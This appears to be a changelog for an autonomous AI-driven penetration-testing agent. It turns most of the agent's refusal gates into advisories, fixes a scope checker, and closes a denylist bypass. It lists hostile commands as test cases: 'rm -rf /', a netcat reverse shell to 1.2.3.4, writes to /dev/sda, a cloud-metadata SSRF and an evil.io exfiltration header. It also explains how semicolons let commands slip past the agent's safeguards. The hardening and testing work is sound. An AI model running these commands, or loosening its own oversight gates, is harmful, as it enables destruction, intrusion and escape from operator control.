# X19 — Autonomy & Truthfulness Pass

What changed, and why. Every item below was reproduced against a live target
before and after; the verification commands are at the bottom.

## The core idea

The agent had accumulated a set of "gates" that **refused to run the model's own
chosen command** and then burned the iteration: self-critique, phase
enforcement, tool-repeat, tool-family fixation, "tool already executed",
justification, dead-branch, banned-category (which additionally **substituted
its own command for the model's**). A run of the loop looked like:

```
Iteration 1  → curl …            (executes)
Iteration 2  → TOOL ALREADY EXECUTED — pivot        (nothing ran, nothing learned)
Iteration 3  → TOOL ALREADY EXECUTED — pivot        (ditto)
Iteration 4  → SELF-CRITIQUE FAILED — tool family   (ditto)
→ Assessment complete — 0 findings
```

That is a permission system wearing an autonomy costume. A real agent acts, and
learns from what came back. So the soft gates now **report and let the command
run**; the refusal is reserved for two things that are genuinely not the model's
to decide:

* commands that destroy the host it runs on, and
* traffic to destinations outside the engagement's scope.

Budgets that prevent unbounded waste (a 20-command cap per category, skipping a
byte-identical command, exponential backoff on a repeatedly failing signature)
stay — they cost nothing to reason about and save real minutes.

`X19_STRICT_GATES=1` restores the old refusing behaviour at the two gates where
it had defensive value (self-critique, phase enforcement).

## Hardcoded state the model was reasoning on

**The single worst bug:** the fast/bug-bounty bootstrap ended with

```python
self.model.add_subdomain(domain)
self.model.add_subdomain(f"www.{domain}")
for p in (80, 443):
    self.model.add_port(p, "tcp", "http" if p == 80 else "https", "")
```

No scan had run (on the test host, `nmap` was not even installed and `dig`
exited 127). Those entries went into the world model, reached the decision
prompt as `OPEN PORTS: 80/tcp http / 443/tcp https`, and drove phase/exploit
pivots in `mission.py`. The agent was reasoning about a target it had never
looked at. Removed — a run that discovers nothing now reports `Surface: 0 subs,
0 URLs`, which is the truth.

**Port stripping:** `_normalize_domain()` did `t.split(":")[0]`, so
`x19 run -t host:8443` sent *all* bootstrap recon to port 80. Split into
`_split_target()` / `_normalize_domain()` (bare host, for DNS tools) /
`_target_origin()` (scheme-correct, port preserved, for HTTP tools).

## Scope checker: it was blocking the agent's own target

`PolicyEngine._extract_refs` matched any dotted quad. The execution helper
decorates every `curl` with a browser User-Agent containing
`Chrome/120.0.0.0`, which matched, and the command was refused as
`out-of-scope reference(s): 120.0.0.0` — on **every** `curl`, against the
target it was assigned. Bootstrap `curl` in the test run returned `exit -1`
for exactly this reason.

Fixed by requiring a dotted quad to stand alone as an argument (scheme prefixes
stripped first, so a destination smuggled into a query string is still caught).
Net effect: false positives gone, and detection got *broader*:

```
curl -sI --user-agent '…Chrome/120.0.0.0…' http://127.0.0.1:8099/   ALLOW  (was BLOCK)
curl -sL http://127.0.0.1:8099/r?to=http://91.99.0.1/x              BLOCK  (was ALLOW)
curl -s 'http://h/f?url=169.254.169.254/latest/meta-data'           BLOCK  (was ALLOW)
curl -s -H 'X-Data: http://evil.io/steal' http://127.0.0.1:8099/    BLOCK  (unchanged)
```

## Destructive-command denylist: `;` bypassed every rule

`ToolExecutor.BLOCKED` patterns are anchored `^\s*`, so a statement prefix
skipped all of them. Confirmed against the real check before the fix:

```
echo hi; rm -rf /                 → passed → subprocess.run(shell=True)
echo hi; reboot                   → passed
true && sudo -i                   → passed
echo x >/dev/sda                  → passed
ls; nc 1.2.3.4 4444 -e /bin/bash  → passed
```

Now splits on shell operators, strips leading `VAR=value` assignments, and
matches per statement (unanchored patterns `re.search`). 12/12 escapes blocked,
7/7 ordinary assessment commands unaffected — `curl … | head -40`,
`dd if=in of=out`, `-d 'p=q&r=s'`, `echo 'test' > out.txt && wc -l out.txt`.

## Evidence that wasn't reaching the model

`_build_context` showed `=== LAST OUTPUT ===` from `model.command_outputs`
ordered by timestamp, and only used the loop's `previous_output` when
`command_outputs` was **empty**:

```python
if last_output and not model.command_outputs:
```

Since bootstrap always stores two outputs, the freshest real result was never
shown; the model saw a stale bootstrap `dig` while deciding its next move. This
is what made the loop repeat itself. The freshest output now always leads, and
the store becomes what it was documented to be: `get_output()` had **zero
callers** while the prompt told the model to "reference by cmd_id", so
`"recall": "cmd_3"` in a decision now actually fetches that output in full.

## Gates that contradicted themselves

* The justification gate's comment read *"warn-only (AI is the boss; we don't
  block its decisions)"* while the code did `continue`. It also demanded the
  model cite "actual open ports, discovered services, found endpoints" — and on
  iteration 1 none exist, *because those commands are how you get them*. With
  the fabricated ports removed, this structurally rejected every opening move.
  Now: exempt while the model is empty, advisory afterwards.
* `_phase_is_stuck()` and the file-read streak printed "FORCING" and skipped
  work; both are advisory now.

## Removed

* `tool_distributions.py` — chose which toolsets to mention in the prompt with
  `random.random()`, so the same target produced a different prompt on each run
  for no information. Its one call site is gone.
* `brain/decision_engine.py` (574 lines) + its 22 tests — a "dynamic scoring
  layer" with hardcoded cost/risk tables that **no production module ever
  imported**. It existed to be tested.
* The prompt line `CRITICAL: ONLY use tools listed as AVAILABLE` and the
  `Max 2 uses per tool per phase` cap. Tool availability is now labelled
  `TOOL INVENTORY (preinstalled — not an allowlist)`, and the charter says
  plainly: run any command, install what's missing, or write the check yourself
  with `python3`/`openssl`/`/dev/tcp`. A missing binary is a detour, not a stop
  — and if it is missing, the shell's own `127` is better feedback than a
  policy refusal, so the command runs.
* `importlib`-style runtime monkeypatching of `network.ProxyManager` from
  `runtime_bootstrap`. `network.py` never imported `sys`, so
  `_detect_mitmproxy()` raised `NameError` — meaning `import agent; X19()`
  crashed for anyone who didn't enter through `run.py`, which "fixed" it by
  replacing the method. `proxy_url()` also disagreed between the two paths
  (`and not self.burp_proc` vs `is not None`), so the same install routed
  traffic differently depending on how you started it. Both fixed at the source.

## Terminal UI

Default `X19_UI=clean`: no 6-row ASCII logo on every invocation, no
`====` rules around each iteration, one status line per tool call instead of a
raw 2500-byte stdout dump, `[Gain]`/`[Reflect]`/`[CONSTRAINT]` moved behind
`X19_VERBOSITY=verbose`, and one startup line (`target · session · ai`) in
place of five. `x19 <target>` and `x19 run <target>` both work; `-t` still
accepted. The first-run gate no longer refuses `x19 run -t h -p groq -k gsk_…`
with "run x19 setup" when the operator is supplying the provider and key in the
same command, and the no-provider message names the actual fix instead of
pointing at a wizard. `X19_UI=rich` and `X19_UI_BANNER=1` restore the old look;
`-v`/`-q` set verbosity.

Before / after on the same target and same model:

```
before                                                       after
Iteration 1                                                  [1/5]
==========                                                   [1/5] start with HTTP baseline
Pivot Score: 0%  Duplicate Responses: 0 …                    $ curl -si http://127.0.0.1:8099/  → exit 0, 216b
[Gain] 9/10 — GAIN=9                                         [2/5] server responds; probe robots.txt next
[*] curl -si http://127.0.0.1:8099/                          $ curl -si …/robots.txt  → exit 0, 205b
HTTP/1.0 200 OK  Server: SimpleHTTP/0.6 … (+40 lines)        [3/5] robots.txt discloses /backup.sql …
[*] Exit: 0                                                  [+] Evidence: /backup.sql
Iteration 2 …TOOL ALREADY EXECUTED…                            → 1 finding, verified
→ 0 findings
```

## Verification

```bash
python -m unittest discover -s tests -t .      # 535 tests, OK
python -m unittest tests.test_autonomy_regressions -v
```

`tests/test_autonomy_regressions.py` pins all of the above: no fabricated
state in source, port preservation, 12 denylist escapes + 7 false-positive
checks, 8 scope cases, advisory-vs-block semantics, and the justification
gate's empty-model exemption.

Also checked live against a local HTTP target with a scripted
OpenAI-compatible endpoint (the endpoint was scripted; execution, gateway,
parsers, reflection, findings validation and reports were all the real code):
default mode produced 1 verified finding from real `robots.txt` output, where
the pre-change run produced 0 and looped.

## Not done (still blockers for "production")

1. **No OS-level isolation.** `ToolExecutor` runs shell commands as the current
   user with `shell=True`. The denylist is now honest, but a denylist parsed
   from a string is not containment. Container/namespace execution (roadmap
   Pillar 3) is the actual fix, and `ScopeGuard`'s socket check belongs on the
   main execution path.
2. **Self-modifying upgrader remains.** `x19upgrader.py` `import_to_main()`
   copies sandbox files over the live source tree, and `self_improve.py` applies
   string-replacement patches guarded by string matching. Fine for a lab tool,
   not for something that holds engagement data.
3. **`datasets/` still has 49 MB of copyrighted books in git.**
4. `agent.py` is still ~6,900 lines; the `brain/` engines are partly wired
   (`StrategistEngine`, `CriticEngine`) while `Planner` heuristics and
   `SERVICE_ATTACKS` templates remain the fallback voice.
